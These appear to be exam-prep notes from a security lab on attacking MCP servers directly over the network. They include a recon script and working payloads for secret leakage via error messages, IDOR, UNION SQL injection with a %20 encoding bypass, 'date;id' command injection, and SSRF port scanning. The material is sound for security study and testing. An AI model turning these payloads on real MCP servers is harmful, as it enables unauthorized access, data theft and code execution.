# Vulnerable MCP Servers

**The foundational insight (this is the whole section):** **MCP servers operate independently of the LLM, so anyone with network access to the server can call its tools and resources directly** - no LLM, no jailbreak, no prompt-injection needed. Maintainers often **falsely assume the client can be trusted because it's "an LLM integration,"** but you just hit the capabilities straight over the network. That removes all the LLM-resilience friction and makes these plain, classic web vulns. Treat every tool/resource parameter as **untrusted input to validate and sanitize.**

### Recon - enumerate capabilities first

Before attacking, list everything the server exposes (resources, resource templates, tools + their params and descriptions):

```python
import asyncio
from fastmcp import Client

client = Client("http://172.17.0.2:8000/mcp/")

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for r in resources:
            print('***'); print(r.name); print(r.description.strip())

        print("Resource Templates:")
        for rt in resource_templates:
            print('***'); print(rt.uriTemplate); print(rt.description.strip())

        print("Tools:")
        for t in tools:
            params = list(t.inputSchema.get('properties').keys())
            print('***'); print(f"{t.name}({','.join(params)})"); print(t.description.strip())

asyncio.run(main())
```

**The descriptions and parameter names are your attack map** - they tell you what external systems each capability touches (DB, web API, filesystem, shell).

### 1. Sensitive Information Disclosure

MCP servers hold credentials, tokens, API keys. **The attack technique is to _provoke errors_** - missing exception handling leaks sensitive data in stack traces / verbose MCP error responses.

Example server exposes `resource://logs`, `resource://items`, `quantity://{item}`.

- **Reading `resource://logs` leaks operational detail** - valid item names (`banana`, `apple`), executed server commands (`date`, `whoami`, `uptime`), and error traces. Recon gold.
- Provoke an error on `quantity://{item}` with an invalid item (`asd!`):

```python
async with client:
    try:
        result_object = await client.read_resource("quantity://asd!")
        print(result_object[0].text)
    except Exception as e:
        print(f"[-] {e}")
```

```
[-] ... Quantity API Error: Requests details: 'http://quantityapi.local/api/item/asd!'
    {'Content-Type': 'application/json', 'User-Agent': 'MCP Server 1.0.0',
     'X-Api-Key': 'REDACTED_LEAKED_KEY'}
```

**The verbose error dumped the upstream request including `X-Api-Key`** -> reuse it for unauthorized API access. Note the caveat: **some servers return a generic error to the client but still write the secret to the logs** - so check both the error _and_ any readable logs resource.

### 2. Broken Authorization (IDOR)

If a capability is scoped per-user, e.g. `document://{doc_id}` (fetch a doc from cloud storage by ID), a server that **doesn't verify the client's authorization lets you read other users' documents by guessing/incrementing the ID** - standard IDOR.

**Important nuance (and commonly tested): IDOR is _rarer_ in MCP servers.** Why: **the MCP server itself holds one access token/API key that already defines its scope.** If the upstream service enforces authz against that token, the server often doesn't need its own checks - the token is the boundary. So broken-authz findings depend on the server juggling multiple scopes or the upstream being permissive.

### 3. Injection Vulnerabilities

#### SQL Injection - on `price://{item}`

Description says "fetched from an API," but **an API usually sits in front of a database**, so probe anyway.

- **Probe** with a single quote -> `price://banana'` -> `Price API Error` (error = promising).
- **Confirm** by commenting out the rest: **`price://banana'--` returns the banana price** -> injection confirmed.
- **Exploit (UNION)** - but the raw payload breaks the URL parser:

```
[-] Input should be a valid URL, invalid domain character ...
    input_value="price://x' UNION SELECT 1--"
```

**The URI can't contain spaces or slashes**, so `UNION SELECT`, and even the `/**/` space-substitute, are blocked. **Bypass:** **URL-encode the spaces with `%20`**:

```
price://x'%20UNION%20SELECT%201--
```

The server echoes the injected `1` -> **UNION-based SQLi confirmed, full DB exfiltration possible.** (The lesson that generalizes: a validation layer sitting _in front of_ the sink - here URL parsing - can often be slipped with encoding.)

#### Command Injection - on `execute_server_command(command)`

Tool claims to allow only `date`, `whoami`, `uptime`:

python

```python
async with client:
    result_object = await client.call_tool("execute_server_command", {"command": "date"})
    print(result_object.content[0].text)
```

Off-whitelist -> `[-] ... Invalid Command`. But the whitelist checks the _command_, not what's chained after it. **Classic shell metacharacters `;`, `|`, `&&` break out**:

```python
await client.call_tool("execute_server_command", {"command": "date;id"})
```

```
Tue May 13 09:56:30 UTC 2025
uid=0(root) gid=0(root) groups=0(root)
```

**`date;id` runs both -> arbitrary command execution, and here as root.** The whitelist was a prefix check, not real validation.

### 4. Server-Side Request Forgery (SSRF)

Tool `fetch_price_data(url)` fetches from an external URL with no sanitization.

- **Confirm** you control the destination - point it at your box and catch it with netcat:

```
$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39604
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
User-Agent: python-requests/2.32.3
```

- **Exploit** - reach the server's internal network / scan ports by reading the response difference:
    - **`http://127.0.0.1:80` -> `Success` -> port open**
    - **`http://127.0.0.1:22` -> `Connection refused` -> port closed**

**The response oracle (Success vs error) turns the tool into an internal port scanner**, and from there a pivot into internal services the server can reach but you can't directly.

---

**Exam-bankable from Section 11:** the core premise - **MCP capabilities are directly network-reachable, so these are plain web vulns, no LLM needed**; the **provoke-errors technique for secret disclosure**; and the three bypass tricks that are classic examples - **`'--` to confirm SQLi, `%20` URL-encoding to beat the URL-parser filter, and `;`/`|`/`&&` to beat a command whitelist**. The SSRF open-vs-refused oracle rounds it out. Each maps to a standard CWE for your report (CWE-200 info disclosure, CWE-639/IDOR, CWE-89 SQLi, CWE-78 command injection, CWE-918 SSRF).

---
